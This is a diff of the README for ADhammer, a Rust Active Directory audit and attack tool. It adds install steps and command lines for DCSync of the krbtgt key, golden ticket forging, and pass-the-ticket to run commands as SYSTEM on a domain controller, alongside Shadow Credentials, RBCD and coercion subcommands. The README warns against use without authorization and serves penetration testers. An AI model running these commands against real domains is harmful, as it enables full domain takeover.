@@ -11,6 +11,10 @@ otherwise exist). Built to run from Kali/Linux against Windows, as a single stat
 > silver tickets, pass-the-ticket, NTLM relay, ADCS abuse, RCE). Use it only against systems you
 > own or are explicitly authorized to test. See [SECURITY.md](SECURITY.md).
 
+![ADhammer demo: DCSync → forge golden ticket → pass-the-ticket over SMB → SYSTEM, run from Kali Linux against a fully-patched Windows Server 2025 DC](docs/demo.gif)
+
+*Above: a single Rust binary on Kali — DCSync the krbtgt key, forge a golden ticket, pass-the-ticket over SMB, and land code execution as `NT AUTHORITY\SYSTEM` on a fully-patched Server 2025 DC.*
+
 ADhammer collects a domain over LDAP, builds a BloodHound-style control-path graph in process,
 runs 33 checks across the four PingCastle categories, and scores the result. On top of the
 passive audit it implements a working offensive stack — Kerberos roasting, password spray,
@@ -31,11 +35,36 @@ written from the wire up.
 | Live-validated on      | **Windows Server 2025** (patched)     | broad                     | broad                     |
 
 The niche: **audit and offense in one Linux-native binary**, on a self-rolled stack — so the
-security-descriptor parser (`sddl`) and the RPC/NTLM/SMB layer (`dcerpc`/`ntlm`/`smb`) are
-reusable Rust crates that don't otherwise exist.
+security-descriptor parser and the RPC/NTLM/SMB layer are reusable Rust crates that don't
+otherwise exist ([`windows-sddl`](https://crates.io/crates/windows-sddl),
+[`ntlmssp`](https://crates.io/crates/ntlmssp),
+[`smb2-client`](https://crates.io/crates/smb2-client),
+[`dcerpc`](https://crates.io/crates/dcerpc)).
+
+## Install
+
+Requires Rust 1.80+ (`rustup`). From Linux (Kali shown) or Windows:
+
+```sh
+git clone https://github.com/icedracon/adhammer
+cd adhammer
+cargo build --release
+# binary at ./target/release/adhammer
+```
+
+On Debian/Kali, the LDAP layer links system TLS — install the build deps first:
+
+```sh
+sudo apt-get install -y build-essential pkg-config libssl-dev
+```
+
+That's the exact flow used to produce the demo above: built from source on Kali and run against
+the DC.
+
+## Usage
 
 ```
-# Interactive (prompts for domain/user, saves session, attack menu):
+# Interactive (prompts for domain/user, saves session, full guided attack menu):
 adhammer                  # first run — enter creds, saved to ~/.config/adhammer/session.json
 adhammer --old            # reuse saved session
 
@@ -53,7 +82,16 @@ adhammer attack rbcd   --account ... --account-password ... --realm CORP.LOCAL -
 # Shadow Credentials (two phases, same subcommand):
 adhammer attack abuse --url ldaps://... --user ... --password ... --insecure --action add-keycred --target victim
 adhammer attack abuse --action pkinit --target victim --realm CORP.LOCAL --kdc dc.corp.local   # → victim.ccache
+
+# DCSync a target (NT hash + Kerberos keys), then forge + use a golden ticket:
+adhammer attack dcsync --host dc.corp.local --domain CORP --user Administrator --password ... --target krbtgt
+adhammer attack golden --kdc dc.corp.local --realm CORP.LOCAL --krbtgt-aes256 <64-hex> --domain-sid S-1-5-21-a-b-c --verify-spn cifs/dc.corp.local
+adhammer attack pth    --host dc.corp.local --realm CORP.LOCAL --krbtgt-aes256 <64-hex> --domain-sid S-1-5-21-a-b-c --spn cifs/dc.corp.local --command whoami
 ```
+
+Prefer the interactive menu — `adhammer` with no args — for golden/silver/pass-the-ticket: it
+auto-fetches the krbtgt/service key (DCSync) and the domain SID (LSAT) from your session, so you
+never paste a key or SID by hand.
 
 `attack abuse` also does `add-spn` (targeted Kerberoast), `add-member`, `set-password`, and
 `write-rbcd`. `attack coerce` is PetitPotam / MS-EFSR.
@@ -181,16 +219,20 @@ LocalSystem` chain succeeds from Kali against the patched DC.
 
 See **[VECTORS.md](VECTORS.md)** for the full closed / partial / open vector matrix and roadmap.
 
-## Build & test
+## Test
 
 ```sh
-cargo build --release      # target/release/adhammer(.exe)
-cargo test --workspace     # 109 unit tests
+cargo test --workspace     # hermetic unit tests (no network)
 ```
 
-Requires Rust 1.80+. Runs from Kali/Linux against Windows (Kali → Windows is the point;
-PingCastle is Windows-only). `ldap3` links platform TLS (native-tls) so LDAPS works against
-legacy DCs whose handshake still uses SHA-1 — which rustls refuses.
+The workspace's 56 unit tests cover the audit/graph/kerberos/secrets layers; the protocol-stack
+tests (~50 more) live in the extracted crates (`windows-sddl`/`ntlmssp`/`smb2-client`/`dcerpc`).
+Live-DC integration tests in `cli/tests/integration.rs` are `#[ignore]`d — run them against a lab
+with `ADH_DC=… ADH_PASS=… cargo test --test integration -- --ignored`.
+
+Runs from Kali/Linux against Windows (Kali → Windows is the point; PingCastle is Windows-only).
+`ldap3` links platform TLS (native-tls) so LDAPS works against legacy DCs whose handshake still
+uses SHA-1 — which rustls refuses.
 
 ## Status & caveats
 
